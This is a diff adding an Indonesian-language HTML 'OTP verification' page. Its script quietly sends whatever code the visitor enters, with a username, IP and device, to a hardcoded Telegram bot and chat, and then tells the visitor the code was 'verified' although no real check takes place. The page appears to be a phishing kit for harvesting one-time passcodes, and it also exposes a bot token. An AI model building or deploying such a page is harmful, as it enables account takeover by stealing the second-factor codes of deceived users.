@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi OTP dan Login</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .otp-input {
+            width: 3.5rem;
+            height: 3.5rem;
+            margin: 0 0.5rem;
+            font-size: 1.5rem;
+            text-align: center;
+            border-radius: 0.5rem;
+            border: 2px solid #d1d5db;
+            transition: all 0.3s;
+        }
+        .otp-input:focus {
+            border-color: #3b82f6;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.2);
+        }
+        .timer {
+            font-size: 1.2rem;
+            color: #ef4444;
+            font-weight: 600;
+        }
+        .resend-btn {
+            cursor: pointer;
+            color: #3b82f6;
+            font-weight: 600;
+        }
+        .resend-btn:disabled {
+            color: #9ca3af;
+            cursor: not-allowed;
+        }
+    </style>
+</head>
+<body class="bg-gray-50 min-h-screen flex items-center justify-center p    -4">
+    <div class="bg-white rounded-xl shadow-lg p-8 max-w-md w-full">
+        <div class="flex flex-col items-center mb-8">
+            <img src="https://placehold.co/80x80" alt="Ikona pencarian dengan latar belakang biru muda berbentuk lingkaran, simbol verifikasi keamanan" class="mb-4 rounded-full">
+            <h1 class="text-2xl font-bold text-gray-800 mb-2">Verifikasi OTP</h1>
+            <p class="text-gray-600 text-center">
+                Kami telah mengirim kode verifikasi 6 digit ke nomor/email Anda. Masukkan kode di bawah ini.
+            </p>
+        </div>
+
+        <form id="otpForm">
+            <div class="flex justify-center mb-6">
+                <input type="text" maxlength="1" class="otp-input" data-index="0">
+                <input type="text" maxlength="1" class="otp-input" data-index="1">
+                <input type="text" maxlength="1" class="otp-input" data-index="2">
+                <input type="text" maxlength="1" class="otp-input" data-index="3">
+                <input type="text" maxlength="1" class="otp-input" data-index="4">
+                <input type="text" maxlength="1" class="otp-input" data-index="5">
+            </div>
+
+            <div class="flex items-center justify-center mb-6">
+                <span class="timer mr-2" id="timer">02:00</span>
+                <span>detik tersisa</span>
+            </div>
+
+            <button
+                type="button"
+                id="resendBtn"
+                disabled
+                class="resend-btn text-center w-full mb-6"
+            >
+                Kirim Ulang Kode
+            </button>
+
+            <button
+                type="submit"
+                class="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-3 px-4 rounded-lg transition duration-300"
+            >
+                Verifikasi
+            </button>
+        </form>
+    </div>
+
+    <script>
+        // Data login yang akan dikirim (contoh)
+        const loginData = {
+            username: 'contoh_user',
+            ip_address: '192.168.1.1',
+            login_time: new Date().toISOString(),
+            device: 'Desktop/Chrome'
+        };
+
+        // Konfigurasi Telegram Bot
+        const TELEGRAM_BOT_TOKEN = '7803087451:AAHUjzxRh-ZPJxGB1P0KsbVqe-4quBtF-cw';
+        const TELEGRAM_CHAT_ID = '7582685852';
+
+        // Timer OTP
+        let timeLeft = 120; // 2 menit dalam detik
+        const timerElement = document.getElementById('timer');
+        const resendBtn = document.getElementById('resendBtn');
+        let timerInterval;
+
+        // Format waktu menjadi mm:ss
+        function formatTime(seconds) {
+            const mins = Math.floor(seconds / 60).toString().padStart(2, '0');
+            const secs = (seconds % 60).toString().padStart(2, '0');
+            return `${mins}:${secs}`;
+        }
+
+        // Memulai timer
+        function startTimer() {
+            timerElement.textContent = formatTime(timeLeft);
+            timerInterval = setInterval(() => {
+                timeLeft--;
+                timerElement.textContent = formatTime(timeLeft);
+                
+                if (timeLeft <= 0) {
+                    clearInterval(timerInterval);
+                    resendBtn.disabled = false;
+                    timerElement.textContent = '00:00';
+                }
+            }, 1000);
+        }
+
+        // Kirim data ke Telegram Bot
+        async function sendToTelegram(otpCode) {
+            const message = `🔐 *LOGIN VERIFICATION*\n\n` +
+                           `📱 *User*: ${loginData.username}\n` +
+                           `🕒 *Time*: ${new Date(loginData.login_time).toLocaleString()}\n` +
+                           `🌐 *IP*: ${loginData.ip_address}\n` +
+                           `💻 *Device*: ${loginData.device}\n\n` +
+                           `✅ *OTP Code*: ${otpCode}\n` +
+                           `⚠️ Verifikasi terdeteksi pada ${new Date().toLocaleString()}`;
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                const data = await response.json();
+                console.log('Message sent to Telegram:', data);
+            } catch (error) {
+                console.error('Error sending to Telegram:', error);
+            }
+        }
+
+        // Handle OTP input
+        const otpInputs = document.querySelectorAll('.otp-input');
+        otpInputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                if (e.target.value.length === 1) {
+                    if (index < otpInputs.length - 1) {
+                        otpInputs[index + 1].focus();
+                    }
+                }
+            });
+
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && e.target.value.length === 0 && index > 0) {
+                    otpInputs[index - 1].focus();
+                }
+            });
+        });
+
+        // Handle form submission
+        document.getElementById('otpForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            let otpCode = '';
+            otpInputs.forEach(input => {
+                otpCode += input.value;
+            });
+
+            if (otpCode.length === 6) {
+                alert(`OTP ${otpCode} berhasil diverifikasi!`);
+                await sendToTelegram(otpCode);
+                
+                // Reset form
+                otpInputs.forEach(input => input.value = '');
+                otpInputs[0].focus();
+                
+                // Reset timer
+                clearInterval(timerInterval);
+                timeLeft = 120;
+                startTimer();
+                resendBtn.disabled = true;
+            } else {
+                alert('Masukkan 6 digit kode OTP dengan lengkap');
+            }
+        });
+
+        // Handle resend OTP
+        resendBtn.addEventListener('click', () => {
+            alert('Kode OTP baru telah dikirim!');
+            clearInterval(timerInterval);
+            timeLeft = 120;
+            startTimer();
+            resendBtn.disabled = true;
+        });
+
+        // Start timer on page load
+        window.addEventListener('DOMContentLoaded', () => {
+            startTimer();
+        });
+    </script>
+</body>
+</html>
